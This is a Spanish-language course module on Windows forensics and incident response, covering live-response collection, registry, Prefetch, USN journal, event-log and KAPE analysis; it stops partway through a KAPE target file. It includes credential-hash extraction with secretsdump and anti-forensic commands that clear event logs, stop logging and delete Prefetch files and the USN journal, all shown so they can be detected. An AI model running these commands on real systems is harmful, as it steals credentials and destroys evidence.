# Windows Forensics & DFIR

---

## Indice

> ⏱️ **Tiempo estimado:** 20 horas (~4 sesiones) (2248 lineas)


1. [Live Response](#1-live-response)
2. [Registry Forensics](#2-registry-forensics)
3. [Amcache/Shimcache](#3-amcache-shimcache)
4. [Prefetch Analysis](#4-prefetch-analysis)
5. [USN Journal](#5-usn-journal)
6. [Event Logs](#6-event-logs)
7. [KAPE (Kroll Artifact Parser Extractor)](#7-kape-kroll-artifact-parser-extractor)
8. [ETW (Event Tracing for Windows)](#8-etw-event-tracing-for-windows)
9. [Memory Analysis con Volatility](#9-memory-analysis-con-volatility)
10. [Timeline Analysis](#10-timeline-analysis)
11. [Plaso/SuperTimeline](#11-plasosupertimeline)
12. [MFT y NTFS Forensics](#12-mft-y-ntfs-forensics)
13. [Browser Forensics](#13-browser-forensics)
14. [Network Forensics Windows](#14-network-forensics-windows)
15. [Malware Persistence Detection](#15-malware-persistence-detection)
16. [Windows Artifact Reference](#16-windows-artifact-reference)
17. [Ejercicios Practicos](#17-ejercicios-practicos)
18. [Apéndice: Cheatsheet](#18-apendice-cheatsheet)

---

## 1. Live Response

### 1.1 Orden de Volatilidad

La regla de oro en DFIR: recolectar los datos mas volatiles primero.

```
Orden de Volatilidad (de mas a menos volatil):
1. Registros de CPU y cache
2. Tabla de routing y cache ARP
3. Memoria RAM (kernel + procesos)
4. Conexiones de red activas
5. Procesos en ejecucion
6. Archivos temporales y swap
7. Discos y almacenamiento
```

### 1.2 Recoleccion Sistematica

```powershell
# === LIVE RESPONSE SCRIPT ===
# Ejecutar como Administrador

# 1. Memoria RAM (lo primero)
# Usar winpmem o dumpit.exe

# 2. Conexiones de red
netstat -anob > conexiones.txt
netstat -anop tcp > conexiones_tcp.txt
netstat -ano > conexiones_simple.txt
netstat -r > tabla_ruteo.txt
arp -a > cache_arp.txt

# 3. Procesos
tasklist /v /fo csv > procesos.csv
tasklist /m > procesos_modulos.csv
wmic process list full /format:csv > procesos_wmi.csv
wmic process get name,executablepath,processid,parentprocessid,creationdate /format:csv > procesos_detalle.csv

# 4. Servicios
wmic service list full /format:csv > servicios.csv
sc query state= all > servicios_sc.txt
sc queryex type= service > servicios_tipo.txt

# 5. Drivers
driverquery /v /fo csv > drivers.csv
driverquery /si > drivers_firmados.txt

# 6. Tareas programadas
schtasks /query /fo csv /v > tareas.csv

# 7. Usuarios y sesiones
net users > usuarios.txt
net localgroup administrators > admins.txt
qwinsta > sesiones.txt
query user > usuarios_logueados.txt
whoami /all > quien_soy.txt

# 8. Registry hives
reg save HKLM\SAM SAM.hive
reg save HKLM\SYSTEM SYSTEM.hive
reg save HKLM\SOFTWARE SOFTWARE.hive
reg save HKLM\SECURITY SECURITY.hive
reg save HKU\.DEFAULT DEFAULT.hive

# 9. Network config
ipconfig /all > red_config.txt
ipconfig /displaydns > dns_cache.txt
nbtstat -n > netbios.txt
netsh wlan show profiles > redes_conocidas.txt

# 10. Event logs (ultimos)
wevtutil epl System system.evtx
wevtutil epl Security security.evtx
wevtutil epl Application application.evtx
wevtutil epl "Windows PowerShell" powershell.evtx
wevtutil epl "Microsoft-Windows-Sysmon/Operational" sysmon.evtx

# 11. Auto-start locations
wmic startup list full /format:csv > startup.csv
reg export "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" run_lm.reg
reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" run_cu.reg

# 12. File system info
fsutil fsinfo drives > unidades.txt
fsutil volume diskfree C: > espacio_disco.txt
```

### 1.3 Herramientas de Recoleccion

| Herramienta | Proposito | Tipo |
|---|---|---|
| KAPE | Recoleccion y procesamiento | Toolkit |
| CyLR | Live response multiplatform | Script |
| FastIR | Recoleccion [forense](../raw/w1n-f0r3ns1cs.md#forense) | [python](../raw/pyth0n-f0r-h4ck1ng.md) |
| GRR Rapid Response | Recoleccion remota | Framework |
| Velociraptor | Recoleccion + analisis | Framework |
| winpmem | Captura de RAM | [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) |
| FTK Imager Lite | Captura de disco | GUI |
| DumpIt | Captura de RAM simple | CLI |

### 1.4 Cadena de Custodia Digital

```powershell
# Documentar todo:
$fecha = Get-Date -Format "yyyyMMdd-HHmmss"
$hostname = $env:COMPUTERNAME
$investigador = "Juan Perez"

# Hash de todo lo recolectado
Get-FileHash -Algorithm SHA256 *.txt, *.csv, *.hive | Export-Csv hashes_$fecha.csv

# Escribir log de recoleccion
@"
Fecha: $fecha
Investigador: $investigador
Sistema: $hostname
Tipo de incidente: [COMPLETAR]
Herramientas usadas: KAPE, winpmem, dumpit
"@ | Out-File -FilePath "log_recoleccion_$fecha.txt"
```

### 1.5 Ejercicios Practicos

**Ejercicio 1.1:** Crea un script de live response completo para [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) que recolecte todos los artefactos del checklist de arriba.

**Ejercicio 1.2:** Simula un incidente: ejecuta un binario sospechoso, captura RAM con winpmem, analiza conexiones de [red](../raw/r3d3s-f0nd4m3nt0s.md) y procesos.

---

## 2. Registry Forensics

### 2.1 Hives del Sistema

Los hives son archivos que contienen el registro de Windows. Son fundamentales en forensica:

| Hive | Ruta | Contenido |
|------|------|-----------|
| SAM | %SystemRoot%\System32\config\SAM | Cuentas de usuario, hashes LM/NT |
| SYSTEM | %SystemRoot%\System32\config\SYSTEM | Configuracion del sistema |
| SOFTWARE | %SystemRoot%\System32\config\SOFTWARE | Software instalado |
| SECURITY | %SystemRoot%\System32\config\SECURITY | Politicas de seguridad |
| DEFAULT | %SystemRoot%\System32\config\DEFAULT | Perfil default |
| NTUSER.DAT | %UserProfile%\NTUSER.DAT | Perfil de usuario |
| USRCLASS.DAT | %UserProfile%\AppData\Local\Microsoft\Windows\UsrClass.dat | Clases [com](../raw/w1n-s9bsyst3ms.md#com) |

### 2.2 Artefactos Forenses en Registry

```powershell
# === SYSTEM HIVE ===

# Ultima hora de apagado
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Windows" -Name ShutdownTime

# Computername
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName"

# TimeZone
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"

# Network interfaces (MAC, IP)
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces"

# USB storage devices
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR"

# Mounted devices (drives)
Get-ChildItem "HKLM:\SYSTEM\MountedDevices"

# Services
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services"
```

```powershell
# === SOFTWARE HIVE ===

# Software instalado
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"

# NetworkList (redes conectadas)
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList"

# Autologon
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# App Paths
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths"
```

```powershell
# === NTUSER.DAT ===

# UserAssist (programas ejecutados desde explorer)
# Ruta: Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count

# MRU (Recent Docs)
# Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs

# Typed URLs (Internet Explorer)
# Software\Microsoft\Internet Explorer\TypedURLs

# RunMRU (ejecutar -> Win+R)
# Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

# LastVisitedMRU
# Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU

# BitLocker recovery keys
# Software\Microsoft\BitLocker\RecoveryInformation
```

### 2.3 UserAssist en Profundidad

UserAssist registra programas ejecutados desde el Explorer:

```c
// Estructura UserAssist:
// Cada entry tiene:
// - Nombre cifrado en ROT-13
// - Session count
// - Focus count
// - Last execution time
// - ID del ejecutable

// Decodificar nombre ROT-13:
function Decode-UserAssist($name) {
    $result = ""
    foreach ($c in $name.ToCharArray()) {
        if ($c -ge 'a' -and $c -le 'z') {
            $result += [char](([int]$c - 97 + 13) % 26 + 97)
        } elseif ($c -ge 'A' -and $c -le 'Z') {
            $result += [char](([int]$c - 65 + 13) % 26 + 65)
        } else {
            $result += $c
        }
    }
    return $result
}
```

### 2.4 SAM y Obtencion de Hashes

```bash
# Los hashes de contraseñas estan en SAM hive
# Formato: LM:NTLM

# Extraer con herramientas:
python3 secretsdump.py -sam SAM.hive -system SYSTEM.hive LOCAL

# Campos del SAM:
# - Username
# - RID (Relative ID)
# - LM Hash
# - NT Hash
# - Account flags (disabled, locked, etc.)
```

### 2.5 ShimCache (AppCompatCache)

ShimCache registra ejecucion de archivos en el SYSTEM hive:

```powershell
# Ubicacion en registry:
# HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache

# Cada entry contiene:
# - Ruta completa del archivo
# - Tamaño del archivo
# - Last modified time
# - Last update time
# - Flags (is executable?)

# Herramientas:
# AppCompatCacheParser.exe (Eric Zimmerman)
# python3 appcompatcache_parser.py SYSTEM.hive
```

### 2.6 [amcache](../raw/w1n-f0r3ns1cs.md#amcache).hve

```bash
# Ubicacion: %SystemRoot%\AppCompat\Programs\AmCache.hve
# Cache de aplicaciones instaladas y ejecutadas

# Informacion que contiene:
# - Archivos ejecutados (.exe, .dll)
# - SHA1 de los archivos
# - Tiempos de ejecucion (first, last)
# - Informacion de instalacion de software
# - Drivers cargados

# Herramientas:
AmCacheParser.exe (Eric Zimmerman)
python3 amcache_parser.py AmCache.hve
```

### 2.7 Registry as Timeline Evidence

```powershell
# Construir timeline desde registry:

# Ultimo login de usuario:
# SAM\Domains\Account\Users\<RID>\F

# Ultimo cambio de password:
# SAM\Domains\Account\Users\<RID>\F

# Instalacion de software:
# SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\<App>\InstallDate

# Primera vez que se conecto a una red:
# SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures

# Ultima vez que se ejecuto un programa:
# UserAssist entries (tiempo de ultima ejecucion)

# Creation time de archivos:
# No del registry, pero MFT tiene esa info
```

### 2.8 Ejercicios Practicos

**Ejercicio 2.1:** Extrae los hives SAM, SYSTEM, SOFTWARE de un sistema Windows. Usa `secretsdump.py` para extraer hashes de contraseñas.

**Ejercicio 2.2:** Analiza UserAssist de un NTUSER.DAT. Identifica que programas se ejecutaron, cuantas veces, y la ultima vez.

**Ejercicio 2.3:** Compara ShimCache entre dos momentos diferentes para identificar nuevos programas ejecutados.

---

## 3. ShimCache/[amcache](../raw/w1n-f0r3ns1cs.md#amcache)

### 3.1 ShimCache (AppCompatCache) Detallado

ShimCache se creo para compatibilidad de aplicaciones. Registra cada archivo ejecutable que se ejecuta en el sistema:

```bash
# Estructura de AppCompatCacheEntry:
# [Header] [Entry 1] [Entry 2] ... [Entry N]

# Cada Entry (Windows 8+):
# - Size (4 bytes)
# - Last Modified Time (8 bytes, FILETIME)
# - Last Update Time (8 bytes, FILETIME)
# - Path Length (2 bytes)
# - Path (variable, Unicode)
# - Flags (2 bytes)

# Flags:
# 0x01: Executable (.exe, .dll)
# 0x02: Recomendado por telemetry
# 0x04: Desaparecio del disco
# 0x08: Encontrado en device

# Limite de entries:
# Windows 7: 1024 entries
# Windows 8: ? (depende de tamano)
# Windows 10: ~1200 entries
```

```python
import struct

def parse_shimcache(data):
    entries = []
    offset = 0
    while offset < len(data) - 20:
        size = struct.unpack('<I', data[offset:offset+4])[0]
        if size == 0:
            break
        mod_time = struct.unpack('<Q', data[offset+4:offset+12])[0]
        update_time = struct.unpack('<Q', data[offset+12:offset+20])[0]
        path_len = struct.unpack('<H', data[offset+20:offset+22])[0]
        path = data[offset+22:offset+22+path_len].decode('utf-16-le', errors='replace')
        flags = struct.unpack('<H', data[offset+22+path_len:offset+24+path_len])[0]
        entries.append({
            'path': path,
            'modified': mod_time,
            'updated': update_time,
            'flags': flags
        })
        offset += 24 + path_len
    return entries
```

### 3.2 AmCache.hve Detallado

```bash
# AmCache es una cache mas completa que ShimCache
# Incluye:
# - Product Name
# - Publisher
# - Binary Type (installer, portable)
# - SHA1 Hash
# - First/Last Run Time
# - Language
# - Architecture (x86, x64)
# - ProgramID
# - File Size

# Keys importantes en AmCache.hve:
# \Root\File\{SHA1}\ -> Datos del archivo
# \Root\Programs\{ProgramID}\ -> Datos del programa
# \Root\Volume{VolumeGUID}\ -> Archivos por volumen
```

### 3.3 Diferencias ShimCache vs AmCache

| Caracteristica | ShimCache | AmCache |
|---|---|---|
| Location | SYSTEM hive | AmCache.hve |
| Que registra | Ejecucion de archivos | Instalacion y ejecucion |
| [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) SHA1 | No | Si |
| Publisher | No | Si |
| Max entries | ~1200 | Ilimitado |
| Windows versions | XP+ | 8+ |
| Limpieza manual | Reinicio | No se limpia |

### 3.4 Ejercicios Practicos

**Ejercicio 3.1:** Parsea un SYSTEM hive con `AppCompatCacheParser` y documenta los 10 archivos mas recientes ejecutados.

**Ejercicio 3.2:** Analiza AmCache.hve de un sistema e identifica software instalado en las ultimas 24 horas.

---

## 4. [prefetch](../raw/w1n-f0r3ns1cs.md#prefetch) Analysis

### 4.1 Que es Prefetch?

Prefetch (.pf) es un mecanismo de Windows para acelerar la carga de aplicaciones. Cada vez que se ejecuta un programa, Windows crea un archivo .pf con informacion:

```bash
# Ubicacion: %SystemRoot%\Prefetch\
# Formato: APPNAME-HASH.pf
# Ejemplo: NOTEPAD.EXE-12345678.pf

# El hash es del path completo del ejecutable
# Maximo 1024 archivos .pf (Windows 10: hasta 4096)
# Aplicaciones: solo .exe
# Vista+ incluye: DLLs cargadas, timestamps
```

### 4.2 Estructura del Archivo Prefetch

```c
// Archivos Prefetch (Windows 10 version 30+):
typedef struct _PF_HEADER_V30 {
    ULONG Version;         // Version (30 para Win10+)
    ULONG Signature;       // "MAM" (0x4D414D) o "SCCA"
    ULONG Size;            // Tamano
    CHAR Name[60];        // Nombre del ejecutable
    GUID VolumeGuid;       // GUID del volumen
    LARGE_INTEGER VolumeCreateTime; // Fecha de creacion del volumen
    LARGE_INTEGER AppCreateTime;    // Fecha de creacion del app
    LONGLONG LastRunTime; // Ultima ejecucion
    LONGLONG LastRunTime2; // Segunda ultima ejecucion
    ULONG RunCount;        // Contador de ejecuciones
    // ... DLLs cargadas, paths, recursos
} PF_HEADER_V30;

// Informacion que contiene:
// - Nombre del ejecutable
// - Path completo (desde version 30)
// - Run count (veces ejecutado)
// - Last 8 run times
// - DLLs cargadas durante la ejecucion
// - Archivos referenciados
// - Volume serial number
// - Creation time del volumen
```

### 4.3 Analisis [forense](../raw/w1n-f0r3ns1cs.md#forense) de Prefetch

```powershell
# Herramientas para analisis:
# PECmd.exe (Eric Zimmerman)
# python3-prefetch.py

# Uso de PECmd:
PECmd.exe -d C:\Windows\Prefetch -c prefetch.csv --csv .
PECmd.exe -f C:\Windows\Prefetch\NOTEPAD.EXE-*.pf

# Ejemplo de output:
# Executable: NOTEPAD.EXE
# Run Count: 15
# Last Run: 2024-05-24 14:30:22
# Path: C:\Windows\System32\notepad.exe
# DLLs loaded: 23
# Volume: C:\ (GUID: xxxxx)
```

```python
import struct, os

class PrefetchParser:
    def parse(self, filepath):
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # Check signature
        if data[4:8] != b'SCCA' and data[4:8] != b'MAM':
            return None
        
        version = struct.unpack('<I', data[0:4])[0]
        name = data[8:68].split(b'\x00')[0].decode('utf-16-le', errors='replace')
        run_count = struct.unpack('<I', data[144:148])[0]
        
        last_run = struct.unpack('<Q', data[120:128])[0]
        
        return {
            'version': version,
            'executable': name,
            'run_count': run_count,
            'last_run': last_run,
            'file_size': len(data)
        }
```

### 4.4 Que Buscar en Prefetch

```powershell
# Indicadores de actividad maliciosa en Prefetch:

# 1. Herramientas de hacking ejecutadas:
# MIMIKATZ.EXE-*.pf
# PROCDUMP.EXE-*.pf
# WINPEAS.EXE-*.pf

# 2. Ejecucion desde path temporal:
# C:\Users\*\AppData\Local\Temp\*.pf

# 3. Ejecucion de un solo archivo desde distintas rutas:
# MALWARE.EXE-HASH1.pf (desde USB)
# MALWARE.EXE-HASH2.pf (desde TEMP)

# 4. Ejecucion en horas inusuales:
# LastRunTime entre 00:00-06:00

# 5. Live off the land binaries:
# WMIC.EXE-*.pf
# POWERSHELL.EXE-*.pf
# CERTUTIL.EXE-*.pf
```

### 4.5 Limitaciones de Prefetch

```powershell
# Prefetch NO registra:
# - Procesos de sistema (System, smss.exe)
# - Algunos servicios
# - Archivos .dll (solo .exe)
# - Aplicaciones de Windows Store (UWP)

# Prefetch se puede deshabilitar:
# HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters
# EnablePrefetcher = 0

# Se puede borrar:
del C:\Windows\Prefetch\*.*
# Pero deja rastro en USN Journal
```

### 4.6 Ejercicios Practicos

**Ejercicio 4.1:** Analiza la carpeta Prefetch de un sistema. Identifica aplicaciones ejecutadas en las ultimas 24 horas y su run count.

**Ejercicio 4.2:** Busca evidencia de ejecucion de herramientas de hacking ([mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz), procdump, psexec) en Prefetch.

---

## 5. USN Journal

### 5.1 Que es USN Journal?

USN Journal es un log de cambios en volumenes NTFS. Registra cada modificacion en el filesystem:

```bash
# Ubicacion: $Extend\$UsnJrnl (metadata del volumen)
# Tamaño tipico: 32MB (configurable: fsutil usn)
# Version: 2.0 (Vista+) y 3.0 (Win8+)

# Uso forense:
# - Ver que archivos se modificaron
# - Detectar creacion/borrado/renombre de archivos
# - Timeline de actividad del filesystem
# - Detectar malware que se borra a si mismo
```

### 5.2 Estructura de USN Entry

```c
typedef struct _USN_RECORD_V3 {
    ULONG RecordLength;       // Longitud del record
    USHORT MajorVersion;      // Version mayor (3)
    USHORT MinorVersion;      // Version menor (0)
    ULONGLONG FileReferenceNumber;    // MFT reference
    ULONGLONG ParentFileReferenceNumber; // MFT reference del padre
    USN Usn;                  // USN sequence number
    LARGE_INTEGER TimeStamp;  // Timestamp
    ULONG Reason;             // Reason flags
    ULONG SourceInfo;         // Source info flags
    ULONG SecurityId;         // Security ID
    ULONG FileAttributes;     // File attributes
    USHORT FileNameLength;    // Longitud del nombre
    USHORT FileNameOffset;    // Offset del nombre
    WCHAR FileName[1];        // Nombre del archivo
} USN_RECORD_V3;
```

### 5.3 Reason Flags

| Flag | Valor | Descripcion |
|------|-------|-------------|
| USN_REASON_DATA_OVERWRITE | 0x00000001 | Sobrescritura de datos |
| USN_REASON_DATA_EXTEND | 0x00000002 | Extension de datos |
| USN_REASON_DATA_TRUNCATION | 0x00000004 | Truncacion |
| USN_REASON_NAMED_DATA_OVERWRITE | 0x00000010 | Named data |
| USN_REASON_NAMED_DATA_EXTEND | 0x00000020 | Named data extend |
| USN_REASON_NAMED_DATA_TRUNCATION | 0x00000040 | Named truncation |
| USN_REASON_FILE_CREATE | 0x00000100 | Creacion de archivo |
| USN_REASON_FILE_DELETE | 0x00000200 | Borrado de archivo |
| USN_REASON_EXTEND | 0x00000400 | Extension |
| USN_REASON_FLUSH | 0x00008000 | Flush de datos |
| USN_REASON_CLOSE | 0x80000000 | Archivo cerrado |
| USN_REASON_RENAME_NEW_NAME | 0x00002000 | Nuevo nombre |
| USN_REASON_RENAME_OLD_NAME | 0x00001000 | Viejo nombre |
| USN_REASON_SECURITY_CHANGE | 0x00000800 | Cambio de seguridad |

### 5.4 Acceso a USN Journal

```powershell
# Desde Windows (NO forense, altera el journal):
fsutil usn readjournal C: > usn.txt
fsutil usn enumdata 1 0 1 C:

# Herramientas forenses:
MFTECmd.exe (Eric Zimmerman)
UsnJrnlCmd.exe port

# Python:
import-usn-journal  # Parsear USN

# Con MFTECmd:
MFTECmd.exe -f "C:\$Extend\$UsnJrnl\$J" --csv output.csv
```

### 5.5 Escenarios Forenses

```bash
# Escenario 1: Malware que se autoborra
# Buscar en USN:
# 1. FILE_CREATE del malware.exe
# 2. FILE_DELETE del mismo archivo
# 3. Entre creacion y borrado -> pocos segundos
# Esto es altamente sospechoso

# Escenario 2: Renombrado
# RENAME_OLD_NAME + RENAME_NEW_NAME
# Malware renombrado a svchost.exe para camuflarse

# Escenario 3: Data overwrite
# DATA_OVERWRITE + CLOSE en archivos de sistema
# Posible alteracion maliciosa

# Escenario 4: Creacion desde USB
# Archivo creado en ruta X, luego borrado
# Buscar por parent reference de carpeta temporal
```

### 5.6 Timeline desde USN

```powershell
# Combinar USN + MFT para timeline completo:
# 1. Parsear USN con MFTECmd
# 2. Filtrar FILE_CREATE
# 3. Buscar patrones temporales

# Ejemplo: Buscar ejecutables creados en temp
MFTECmd.exe -f "C:\$Extend\$UsnJrnl\$J" --csv output.csv
Select-String -Path output.csv -Pattern "Temp\\" | Select-String ".exe"
```

### 5.7 Limitaciones de USN

- No captura TODOS los cambios (tiene buffer limitado)
- Se puede deshabilitar: `fsutil usn deletejournal /D C:`
- Windows puede truncarlo si crece mucho
- Si se llena, sobrescribe entries viejas

### 5.8 Ejercicios Practicos

**Ejercicio 5.1:** Usa MFTECmd para parsear USN Journal y crea una timeline de actividad del filesystem en las ultimas 24 horas.

**Ejercicio 5.2:** Simula la creacion y borrado de un archivo malicioso. Detectalo en USN buscando el patron FILE_CREATE + FILE_DELETE rapido.

---

## 6. [event logs](../raw/w1n-f0r3ns1cs.md#event-logs)

### 6.1 Estructura de Event Logs (.[evtx](../raw/w1n-f0r3ns1cs.md#event-logs))

Windows Event Log usa formato EVTX (XML binario):

```bash
# Ubicacion: %SystemRoot%\System32\winevt\Logs\
# Extension: .evtx

# Logs principales:
# - Application.evtx: Aplicaciones de usuario
# - System.evtx: Eventos del sistema
# - Security.evtx: Eventos de seguridad (logon, logoff)
# - Setup.evtx: Instalaciones
# - PowerShell.evtx: Scripts de PowerShell
# - Windows PowerShell.evtx: PS (mejor)
# - Microsoft-Windows-Sysmon/Operational: Sysmon
```

### 6.2 Event [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips)) Criticos para DFIR

| Event ID | Descripcion | Log |
|----------|-------------|-----|
| 4624 | Logon exitoso | Security |
| 4625 | Logon fallido | Security |
| 4634 | Logoff | Security |
| 4647 | Logoff iniciado | Security |
| 4648 | Logon explicito (RunAs) | Security |
| 4672 | Asignacion de privilegios especiales (admin) | Security |
| 4688 | Creacion de [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) | Security |
| 4689 | Terminacion de proceso | Security |
| 4698 | Creacion de tarea programada | Security |
| 4699 | Borrado de tarea programada | Security |
| 4702 | Actualizacion de tarea | Security |
| 4720 | Creacion de usuario | Security |
| 4732 | Agregado a grupo local | Security |
| 4768 | TGT solicitado (Kerberos) | Security |
| 4769 | Service ticket solicitado (Kerberos) | Security |
| 4776 | Validacion de credenciales | Security |
| 5140 | Acceso a file share | Security |
| 5152 | Bloqueo de [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) | Security |
| 5156 | Conexion permitida por firewall | Security |
| 7045 | Servicio instalado | System |
| 7036 | Servicio inicio/paro | System |
| 1001 | Windows Error Reporting | Application |
| 1006 | Antimalware detection | Defender |
| 1116 | Defender detection | Defender |
| 1117 | Defender remediation | Defender |
| 4104 | Script block ([powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)) | [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) |
| 4103 | [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) execution (PS) | PowerShell |
| 1 | Process creation ([sysmon](../raw/3dr-3v4s10n.md#sysmon)) | [sysmon](../raw/3dr-3v4s10n.md#sysmon) |
| 3 | Network connect (Sysmon) | Sysmon |
| 7 | Image loaded (Sysmon) | Sysmon |
| 8 | CreateRemoteThread (Sysmon) | Sysmon |
| 10 | Process access (Sysmon) | Sysmon |
| 11 | FileCreate (Sysmon) | Sysmon |
| 13 | RegistryEvent (Sysmon) | Sysmon |
| 15 | FileCreateStreamHash (Sysmon) | Sysmon |
| 22 | DNSEvent (Sysmon) | Sysmon |

### 6.3 Consultas Frecuentes en Event Logs

```powershell
# Buscar logons con cuenta local
Get-WinEvent -LogName Security -FilterXPath @"
*[System[EventID=4624 and 
    EventData[Data[@Name='LogonType']='2' or 
              Data[@Name='LogonType']='10']]]
"@ -MaxEvents 100

# Buscar creacion de procesos
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688]]" -MaxEvents 50 |
    Select TimeCreated, @{n='Process';e={$_.Properties[5].Value}}

# Buscar instalacion de servicios
Get-WinEvent -LogName System -FilterXPath "*[System[EventID=7045]]" -MaxEvents 20
```

```xml
<!-- Evento 4688 (Process Creation) en XML -->
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" />
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2024-05-24T14:30:22.123Z" />
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-21-...</Data>
    <Data Name="SubjectUserName">jperez</Data>
    <Data Name="NewProcessName">C:\Users\jperez\malware.exe</Data>
    <Data Name="CreatorProcessName">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ProcessId">0x1234</Data>
    <Data Name="CommandLine">malware.exe -silent -payload</Data>
  </EventData>
</Event>
```

### 6.4 PowerShell Logging

```powershell
# PowerShell logs registran:
# - Script blocks (EventID 4104)
# - Pipeline execution (EventID 4103)
# - PowerShell start (EventID 400/403)

# Ver script blocks:
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object Id -eq 4104 |
    Select-Object TimeCreated,
        @{n='Script';e={$_.Properties[2].Value}}

# Script block logging captura:
# - Scripts completos (ofuscados o no)
# - Comandos ejecutados
# - Parametros
# - Output
```

### 6.5 Sysmon

```powershell
# Sysmon (System Monitor) de Sysinternals
# Driver que registra actividad detallada del sistema

# Instalacion:
Sysmon64.exe -accepteula -i sysmon-config.xml

# Config basica:
# - Process creation (EventID 1)
# - Network connections (EventID 3)
# - Image loading (EventID 7)
# - Remote thread creation (EventID 8)
# - Process access (EventID 10)
# - File creation (EventID 11)
# - Registry events (EventID 13)
# - DNS queries (EventID 22)
```

### 6.6 Tampering de Event Logs

```powershell
# Los atacantes intentan:
# 1. Limpiar logs especificos:
wevtutil cl Security
wevtutil cl System

# 2. Detener el servicio:
sc stop EventLog

# 3. Borrar archivos .evtx:
del C:\Windows\System32\winevt\Logs\Security.evtx

# Como detectar tampering:
# 1. Huecos en la secuencia de eventos
# 2. EventID 1102 (Log cleared)
# 3. Logs truncados o incompletos
# 4. Service stop/start en System log
# 5. USN journal de borrado de .evtx
```

### 6.7 Logon Types Reference

| Logon Type | Descripcion | Ejemplo |
|---|---|---|
| 2 | Interactivo | Usuario logueado localmente |
| 3 | [red](../raw/r3d3s-f0nd4m3nt0s.md) | Conexion a recurso compartido |
| 4 | Batch | Tarea programada |
| 5 | Servicio | Inicio de servicio |
| 7 | Desbloqueo | Pantalla desbloqueada |
| 8 | NetworkCleartext | IIS basic auth |
| 9 | NewCredentials | RunAs |
| 10 | RemoteInteractive | RDP |
| 11 | CachedInteractive | Cache de credenciales |

### 6.8 Ejercicios Practicos

**Ejercicio 6.1:** Configura Sysmon con una config completa. Analiza los eventos generados al ejecutar un binario sospechoso.

**Ejercicio 6.2:** En un Security log exportado, busca:
- Todos los logons fallidos (4625) en las ultimas 24h
- Creacion de procesos con cmd.exe como padre
- Servicios instalados recientemente (7045)

---

## 7. KAPE (Kroll Artifact Parser Extractor)

### 7.1 Que es KAPE?

KAPE recolecta y procesa artefactos forenses de manera eficiente:

```bash
# Estructura:
# KAPE.exe: Recolector
# KAPE.exe --tsource .\source --tdest .\output --target Registry
# gkape.exe: GUI

# Componentes:
# Targets: Que recolectar
#   - !SANS_Triage: Coleccion completa SANS
#   - Registry: Hives del registro
#   - Events: Event logs
#   - Prefetch: Archivos .pf
#   - SRUM: System Resource Usage Monitor
#   - Amcache: AmCache.hve
#   - LNK: Accesos directos
#   - JumpLists: Jump lists

# Modules: Como procesar
#   - PECmd: Prefetch parser
#   - MFTECmd: MFT/USN parser
#   - AppCompatCacheParser: ShimCache parser
#   - AmCacheParser: AmCache parser
#   - RecentFileCacheParser: RecentFileCache
#   - RegistryExplorer: Registry
```

### 7.2 Comandos Basicos

```powershell
# Recolectar targets basicos:
kape.exe --tsource C:\ --tdest D:\output --target !SANS_Triage

# Targets especificos:
kape.exe --tsource C:\ --tdest D:\output --target Registry
kape.exe --tsource C:\ --tdest D:\output --target Events
kape.exe --tsource C:\ --tdest D:\output --target Prefetch

# Procesar despues de recolectar:
kape.exe --msource D:\output --mdest D:\processed --module !EzParser

# Target + Module combinado:
kape.exe --tsource C:\ --tdest D:\output --target !SANS_Triage `
    --msource D:\output --mdest D:\processed --module !EzParser
```

### 7.3 Crear Targets Personalizados

```xml
<!-- Ejemplo de target personalizado: malware_triage.mkape -->
<Targets>
  <Target name="MalwareTriage">
    <Description>Recolectar artefactos de posible infeccion</Description>
    <Conditions>
      <OSType>Windows</OSType>
    </Conditions>
    <Files>
      <File>%SystemRoot%\Prefetch\*EXE-*.pf</File>
      <File>%SystemRoot%\System32\winevt\Logs\Security.evtx</File>
      <File>%SystemRoot%\System32\winevt\Logs\System.evtx</File>
      <File>%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-Sysmon*.evtx</File>
      <File>%SystemRoot%\System32\config\*.hve</File>
      <File>%ProgramData%\Microsoft\Windows\WER\*.*</File>
      <File>%UserProfile%\NTUSER.DAT</File>
